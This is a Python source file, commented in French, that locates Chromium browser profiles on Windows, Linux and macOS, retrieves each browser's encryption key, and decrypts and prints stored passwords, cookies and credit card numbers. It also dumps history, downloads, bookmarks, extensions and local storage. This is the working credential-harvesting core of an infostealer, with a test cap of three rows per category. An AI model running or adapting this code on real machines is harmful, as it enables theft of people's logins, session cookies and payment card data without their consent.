from Crypto.Cipher import AES
from classes import Profile, Browser
from config import CHROMIUM_BROWSERS
import subprocess
import shutil
import json
import base64
import os
import sqlite3
import utils

browsers = []

def list_browsers():
    """
    Répertorie les navigateurs Chromium installés sur le système, en différenciant les profils
    """
    global browsers
    print("🔍 Recherche des navigateurs Chromium")
    # Parcours de la liste des navigateurs
    for browser, paths in CHROMIUM_BROWSERS["browser"].items():
        if utils.IS_WINDOWS:
            user_data_path = paths["windows"]
        elif utils.IS_LINUX:
            user_data_path = paths["linux"]
        else:
            user_data_path = paths["mac"]

        if user_data_path.exists():
            # Création d'une instance de navigateur
            browser = Browser(browser, user_data_path)
            for folder in browser.user_data_path.iterdir():
                if folder.name.startswith("Profile") or folder.name == "Default":
                    # Création d'une instance de profil
                    browser.profiles.append(Profile(folder.name, folder))

            # Ajout du navigateur à la liste
            browsers.append(browser)

# Fonction pour récupérer la clé de chiffrement
def get_encryption_key(local_state_path):
    try:
        with open(local_state_path, "r", encoding="utf-8") as file:
            local_state = json.load(file)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]

        if utils.IS_WINDOWS:
            import win32crypt
            return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

        elif utils.IS_LINUX:
            return subprocess.check_output(
                ["secret-tool", "lookup", "chrome", "os_crypt"]
            ).strip()

        elif utils.IS_MAC:
            return (
                subprocess.check_output(
                    [
                        "security",
                        "find-generic-password",
                        "-s",
                        "Chrome Safe Storage",
                        "-w",
                    ]
                )
                .strip()
                .encode()
            )

    except Exception as e:
        print(f"❌ Erreur récupération clé : {e}")
        return None

# Fonction pour déchiffrer un mot de passe
def decrypt_value(encrypted_password, key):
    try:
        if encrypted_password[:3] != b"v10":
            return "Format inconnu"

        iv = encrypted_password[3:15]  # IV de 12 octets
        payload = encrypted_password[15:-16]  # Données chiffrées
        tag = encrypted_password[-16:]  # Tag d'authentification AES-GCM

        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt_and_verify(payload, tag).decode()
    except Exception:
        return "Format inconnu"

# Fonction pour extraire les mots de passe stockés
def extract_passwords(browser: Browser, profile: Profile = None):
    print(f"Extraction des mots de passe")
    login_dbs = []

    # Si un profil est spécifié, on ajoute le chemin des bdd de logins
    if profile:
        for login_db in CHROMIUM_BROWSERS["db"]["logins"]:
            login_dbs.append(profile.profile_path / login_db)
    else:
        login_dbs = [browser.user_data_path / login_db for login_db in CHROMIUM_BROWSERS["db"]["logins"]]

    # On boucle sur tous les chemins potentiels
    for login_db in login_dbs:
        nb_pass = 0
        if not login_db.exists():
            continue

        # Copie temporaire du fichier de mots de passe
        temp_db = login_db.with_suffix(".temp")
        shutil.copy(login_db, temp_db)

        try:
            conn = sqlite3.connect(str(temp_db))
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, action_url, username_value, password_value FROM logins")

            counter = 0
            for (
                origin_url,
                action_url,
                username,
                encrypted_password,
            ) in cursor.fetchall():
                password = decrypt_value(encrypted_password, browser.encryption_key)
                if password and password != "Format inconnu":
                    print(f"[🌍] URL d'origine: {origin_url}")
                    print(f"[🌍] URL de login: {action_url}")
                    print(f"[👤] Username: {username}")
                    print(f"[🔑] Password: {password}\n")
                    counter += 1
                    nb_pass += 1
                    # Uniquement les 3 premiers résultats pour tester
                    if counter > 2:
                        break

            conn.close()
            os.remove(temp_db)

        except Exception as e:
            print(f"❌ Erreur extraction {browser} : {e}")

    if nb_pass:
        print(f"🔑 {nb_pass} mot(s) de passe trouvé(s)\n")
    else:
        print("❌ Aucun mot de passe trouvé\n")    

# Fonction pour extraire l'historique de navigation
def extract_history(browser, profile: Profile = None):
    print(f"Extraction de l'historique")
    if profile:
        history_db = profile.profile_path / CHROMIUM_BROWSERS["db"]["history"]
    else:
        history_db = browser.user_data_path / CHROMIUM_BROWSERS["db"]["history"]

    if not history_db.exists():
        print(f"❌ Fichier d'historique non présent")
        return

    # Copie temporaire du fichier d'historique
    temp_db = history_db.with_suffix(".temp")
    shutil.copy(history_db, temp_db)

    try:
        conn = sqlite3.connect(str(temp_db))
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls")

        counter = 0
        for url, title, visit_count, last_visit_time in cursor.fetchall():
            print(f"[🌍] URL: {url}")
            print(f"[📜] Title: {title}")
            print(f"[🔍] Visites: {visit_count}")
            print(f"[🕒] Dernière visite: {last_visit_time}\n")
            counter += 1
            if counter > 2:
                break

        conn.close()
        os.remove(temp_db)

    except Exception as e:
        print(f"❌ Erreur extraction {browser} : {e}")        

# Fonction pour extraire l'historique des téléchargements
def extract_download_history(browser, profile: Profile = None):
    print(f"Extraction de l'historique des téléchargements")
    if profile:
        history_db = profile.profile_path / CHROMIUM_BROWSERS["db"]["history"]
    else:
        history_db = browser.user_data_path / CHROMIUM_BROWSERS["db"]["history"]

    if not history_db.exists():
        print(f"❌ Fichier d'historique non présent")
        return

    # Copie temporaire du fichier d'historique
    temp_db = history_db.with_suffix(".temp")
    shutil.copy(history_db, temp_db)

    try:
        conn = sqlite3.connect(str(temp_db))
        cursor = conn.cursor()
        cursor.execute(
            "SELECT target_path, tab_url, total_bytes, start_time, end_time, mime_type FROM downloads"
        )

        counter = 0
        for target_path, tab_url, total_bytes, start_time, end_time, mime_type in cursor.fetchall():
            print(f"[📂] Fichier: {target_path}")
            print(f"[🌍] URL: {tab_url}")
            print(f"[📦] Taille: {total_bytes} octets")
            print(f"[🕒] Début: {start_time}")
            print(f"[🕒] Fin: {end_time}")
            print(f"[🔖] Type MIME: {mime_type}\n")
            counter += 1
            if counter > 2:
                break

        conn.close()
        os.remove(temp_db)

    except Exception as e:
        print(f"❌ Erreur extraction {browser} : {e}")

# Extraction des cookies impossible des cookies en V20 impossible, on essaie de récupérer les cookies en V10 si il y en a
def extract_cookies(browser, profile: Profile = None):
    print(f"Extraction des cookies")
    if profile:
        cookies_db = profile.profile_path / CHROMIUM_BROWSERS["db"]["cookies"]
    else:
        cookies_db = browser.user_data_path / CHROMIUM_BROWSERS["db"]["cookies"]

        if not cookies_db.exists():
            print(f"❌ Fichier de cookies non présent")
            return

    # Copie temporaire du fichier de cookies
    temp_db = cookies_db.with_suffix(".temp")

    try:
        shutil.copy(cookies_db, temp_db)
    except Exception as e:
        print(f"❌ Erreur copie fichier de cookies : {e}")
        return

    try:
        conn = sqlite3.connect(str(temp_db))
        cursor = conn.cursor()
        cursor.execute(
            "SELECT name, cast(encrypted_value AS BLOB), host_key, path, creation_utc, expires_utc, is_secure, is_httponly, has_expires, is_persistent FROM cookies"
        )

        counter = 0
        for name, encrypted_value, host_key, path, creation_utc, expires_utc, is_secure, is_httponly, has_expires, is_persistent in cursor.fetchall():
            if encrypted_value[:3] == b"v10":
                decrypted_value = decrypt_value(encrypted_value, browser.encryption_key)
                print(f"[🍪] Nom: {name}")
                print(f"[🔑] Valeur: {decrypted_value}")
                print(f"[🌍] Domaine: {host_key}")
                print(f"[📂] Chemin: {path}")
                print(f"[🕒] Création: {creation_utc}")
                print(f"[🕒] Expiration: {expires_utc}")
                print(f"[🔒] Sécurisé: {is_secure}")
                print(f"[🔒] HttpOnly: {is_httponly}\n")
                counter += 1
                if counter > 2:
                    break
        conn.close()
        os.remove(temp_db)

    except Exception as e:
        print(f"❌ Erreur extraction {browser} : {e}\n")

# Fonction pour extraire les favoris
def extract_bookmarks(browser, profile: Profile = None):
    print(f"Extraction des favoris")
    if profile:
        bookmarks_db = profile.profile_path / CHROMIUM_BROWSERS["db"]["bookmarks"]
    else:
        bookmarks_db = browser.user_data_path / CHROMIUM_BROWSERS["db"]["bookmarks"]

    if not bookmarks_db.exists():
        print(f"❌ Fichier de favoris non présent")
        return

    # Copie temporaire du fichier de favoris
    temp_db = bookmarks_db.with_suffix(".temp")
    shutil.copy(bookmarks_db, temp_db)

    try:
        with open(temp_db, "r", encoding="utf-8") as file:
            bookmarks = json.load(file)
                
            print(bookmarks)

        os.remove(temp_db)

    except Exception as e:
        print(f"❌ Erreur extraction {browser} : {e}")

# Fonction pour extraire les extensions
def extract_extensions(browser, profile: Profile = None):
    print(f"Extraction des extensions")
    if profile:
        extensions_path = profile.profile_path / CHROMIUM_BROWSERS["db"]["extensions"]
    else:
        extensions_path = browser.user_data_path / CHROMIUM_BROWSERS["db"]["extensions"]

    if not extensions_path.exists():
        print(f"❌ Dossier d'extensions non présent")
        return

    # Copie temporaire du dossier d'extensions
    temp_db = extensions_path.with_suffix(".temp")
    try:
        shutil.copytree(extensions_path, temp_db)
        extensions = []
        for content in temp_db.iterdir():
            if content.is_dir():
                id = content.name
                for root, _, files in os.walk(content):
                    for file in files:
                        if file == "manifest.json":
                            manifest_file = os.path.join(root, file)
                            with open(manifest_file, "r", encoding="utf-8") as file:
                                manifest_content = json.load(file)
                                extensions.append(parse_chromium_extension(manifest_content, id))
    except Exception as e:
        print(f"❌ Erreur extraction : {e}")
    finally:
        shutil.rmtree(temp_db, ignore_errors=True)

# Récupération des données d'une extension
def parse_chromium_extension(manifest_content, id) -> dict:
    keys = ["name", "version", "description", "update_url", "homepage_url"]
    extension_data = {}
    
    for key in keys:
        if key in manifest_content:
            if key == "update_url":
                extension_data[key] = get_chromium_ext_url(id, manifest_content[key])
            else:
                extension_data[key] = manifest_content[key]
                
    extension_data["id"] = id
    extension_data["enabled"] = manifest_content.get("disable_reasons", True)
    return extension_data

# Récupération de l'url de l'extension
def get_chromium_ext_url(id, update_url):
    if update_url and update_url.endswith("clients2.google.com/service/update2/crx"):
        return "https://chrome.google.com/webstore/detail/" + id
    elif update_url and update_url.endswith(
        "edge.microsoft.com/extensionwebstorebase/v1/crx"
    ):
        return "https://microsoftedge.microsoft.com/addons/detail/" + id
    return ""

# Fonction pour extraire les cartes de crédit
# @TODO : Tester
def extract_credit_cards(browser, profile: Profile = None):
    print(f"Extraction des cartes de crédit")
    if profile:
        credit_cards_db = profile.profile_path / CHROMIUM_BROWSERS["db"]["credit_cards"]
    else:
        credit_cards_db = browser.user_data_path / CHROMIUM_BROWSERS["db"]["credit_cards"]

    if not credit_cards_db.exists():
        print(f"❌ Fichier de cartes de crédit non présent")
        return

    # Copie temporaire du fichier de cartes de crédit
    temp_db = credit_cards_db.with_suffix(".temp")
    shutil.copy(credit_cards_db, temp_db)

    try:
        conn = sqlite3.connect(str(temp_db))
        cursor = conn.cursor()
        cursor.execute(
            "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"
        )

        counter = 0
        for name_on_card, expiration_month, expiration_year, encrypted_card_number in cursor.fetchall():
            card_number = decrypt_value(encrypted_card_number, browser.encryption_key)
            print(f"[💳] Nom sur la carte: {name_on_card}")
            print(f"[📅] Mois d'expiration: {expiration_month}")
            print(f"[📅] Année d'expiration: {expiration_year}")
            print(f"[🔑] Numéro de carte: {card_number}\n")
            counter += 1
            if counter > 2:
                break

        conn.close()
        os.remove(temp_db)

    except Exception as e:
        print(f"❌ Erreur extraction {browser} : {e}")

# Fonction pour extraire le local storage
def extract_local_storage(browser, profile: Profile = None):
    print(f"Extraction du local storage")
    if profile:
        local_storage_path = profile.profile_path / CHROMIUM_BROWSERS["db"]["local_storage"]
    else:
        local_storage_path = browser.user_data_path / CHROMIUM_BROWSERS["db"]["local_storage"]
        
    if not local_storage_path.exists():
        print(f"❌ Dossier de local storage non présent")
        return
    
    temp_db = local_storage_path.with_suffix(".temp")
    
    try:
        shutil.copytree(local_storage_path, temp_db)
        local_storage = []
        for content in temp_db.iterdir():
            if content.is_file() and content.suffix == ".localstorage":
                with open(content, "r", encoding="utf-8") as file:
                    localstorage_content = json.load(file)
                    local_storage.append(parse_chromium_local_storage(localstorage_content))
    except Exception as e:
        print(f"❌ Erreur extraction : {e}")
    finally:
        shutil.rmtree(temp_db, ignore_errors=True)
        
        
def parse_chromium_local_storage(localstorage_content) -> dict:
    keys = ["key", "value"]
    local_storage_data = {}
    
    for key in keys:
        if key in localstorage_content:
            local_storage_data[key] = localstorage_content[key]
                
    return local_storage_data        

# Fonction pour extraire les données
def extract_data():
    list_browsers()

    if not browsers:
        print("❌ Aucun navigateur trouvé\n")
        return
    else :
        print(f"✅ {len(browsers)} navigateurs trouvés\n")

    for browser in browsers:
        print(f"🤫 Extraction des données pour {browser}\n")

        # @TODO Ne pas appeler si on ne récupère pas les mots de passe ou les cartes de crédit
        key = get_encryption_key(browser.local_state_path)
        if key is None:
            print(f"❌ Clé de chiffrement non trouvée pour {browser}")
        else:
            print(f"=== Clé de chiffrement trouvée pour {browser} ✅ ===")
            browser.encryption_key = key

        if not browser.profiles:
            print(f"🔍 Extraction des données pour le profil par défaut")
            # extract_passwords(browser)
            # extract_history(browser)
            # extract_download_history(browser)
            # extract_cookies(browser)
            # extract_bookmarks(browser)
            # extract_extensions(browser)
            # extract_credit_cards(browser)
            extract_local_storage(browser)
        else:
            for profile in browser.profiles:
                print(f"🔍 Extraction des données pour le profil {profile} sur le navigateur {browser}")
                # extract_passwords(browser, profile)
                # extract_history(browser, profile)
                # extract_download_history(browser, profile)
                # extract_cookies(browser, profile)
                # extract_bookmarks(browser, profile)
                # extract_extensions(browser, profile)
                # extract_credit_cards(browser, profile)
                extract_local_storage(browser, profile)
